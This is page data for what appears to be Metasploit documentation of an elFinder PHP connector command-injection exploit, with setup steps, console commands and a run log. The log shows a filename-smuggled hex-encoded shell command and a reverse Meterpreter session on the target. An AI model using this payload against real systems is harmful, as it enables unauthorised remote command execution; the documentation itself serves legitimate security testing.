{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection","result":{"data":{"moduleMetadataJson":{"id":"838fd463-2a00-5b7a-bb77-b7eff151631e","name":"elFinder PHP Connector exiftran Command Injection","fullname":"exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection","description":"This module exploits a command injection vulnerability in elFinder\n        versions prior to 2.1.48.\n\n        The PHP connector component allows unauthenticated users to upload\n        files and perform file modification operations, such as resizing and\n        rotation of an image. The file name of uploaded files is not validated,\n        allowing shell metacharacters.\n\n        When performing image operations on JPEG files, the filename is passed\n        to the `exiftran` utility without appropriate sanitization, causing\n        shell commands in the file name to be executed, resulting in remote\n        command injection as the web server user.\n\n        The PHP connector is not enabled by default.\n\n        The system must have `exiftran` installed and in `$PATH`.\n\n        This module has been tested successfully on elFinder versions 2.1.47,\n        2.1.20 and 2.1.16 on Ubuntu.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection","documentationSlug":"/modules/documentation/exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>  This module exploits a command injection vulnerability in elFinder\nversions prior to 2.1.48.</p>\n<p>  The PHP connector component allows unauthenticated users to upload\nfiles and perform file modification operations, such as resizing and\nrotation of an image. The file name of uploaded files is not validated,\nallowing shell metacharacters.</p>\n<p>  When performing image operations on JPEG files, the filename is passed\nto the <code class=\"language-text\">exiftran</code> utility without appropriate sanitization, causing\nshell commands in the file name to be executed, resulting in remote\ncommand injection as the web server user.</p>\n<p>  The PHP connector is not enabled by default.</p>\n<p>  The system must have <code class=\"language-text\">exiftran</code> installed and in <code class=\"language-text\">$PATH</code>.</p>\n<h2 id=\"vulnerable-software\" style=\"position:relative;\"><a href=\"#vulnerable-software\" aria-label=\"vulnerable software permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Software</h2>\n<p>  <a href=\"https://studio-42.github.io/elFinder/\">elFinder</a> is an open-source file\nmanager for web, written in JavaScript using jQuery and jQuery UI.</p>\n<p>  This module has been tested successfully on elFinder versions 2.1.47,\n2.1.20 and 2.1.16 on Ubuntu.</p>\n<p>  Enable the PHP connector:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">mv php/connector.minimal.php-dist php/connector.minimal.php</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>  Install required <code class=\"language-text\">exiftran</code> utility:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">apt-get install exiftran</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li>Do: <code class=\"language-text\">use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection</code></li>\n<li>Do: <code class=\"language-text\">set rhosts &lt;IP&gt;</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>You should get a new session</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>TARGETURI</strong></p>\n<p>  The base path to elFinder (default: <code class=\"language-text\">/elFinder/</code>)</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection \nmsf5 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) &gt; set rhosts 172.16.191.253\nrhosts =&gt; 172.16.191.253\nmsf5 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) &gt; set targeturi /elFinder-2.1.47\ntargeturi =&gt; /elFinder-2.1.47\nmsf5 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) &gt; set verbose true\nverbose =&gt; true\nmsf5 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) &gt; check\n[*] 172.16.191.253:80 - The target service is running, but could not be validated.\nmsf5 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) &gt; run\n\n[*] Started reverse TCP handler on 172.16.191.165:4444 \n[*] Uploading payload &#39;CDj7j1.jpg;echo 6370202e2e2f66696c65732f43446a376a312e6a70672a6563686f2a202e6b50555871684d5a2e706870 |xxd -r -p |sh&amp; #.jpg&#39; (1894 bytes)\n[*] Triggering vulnerability via image rotation ...\n[*] Executing payload (/elFinder-2.1.47/php/.kPUXqhMZ.php) ...\n[*] Sending stage (38247 bytes) to 172.16.191.253\n[*] Meterpreter session 1 opened (172.16.191.165:4444 -&gt; 172.16.191.253:35564) at 2019-03-08 21:57:18 -0500\n[!] Tried to delete .kPUXqhMZ.php, unknown result\n[*] No reply\n[*] Removing uploaded file ...\n[+] Deleted uploaded file\n\nmeterpreter &gt; getuid\nServer username: www-data (33)\nmeterpreter &gt; sysinfo\nComputer    : ubuntu\nOS          : Linux ubuntu 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64\nMeterpreter : php/linux\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"838fd463-2a00-5b7a-bb77-b7eff151631e"}}}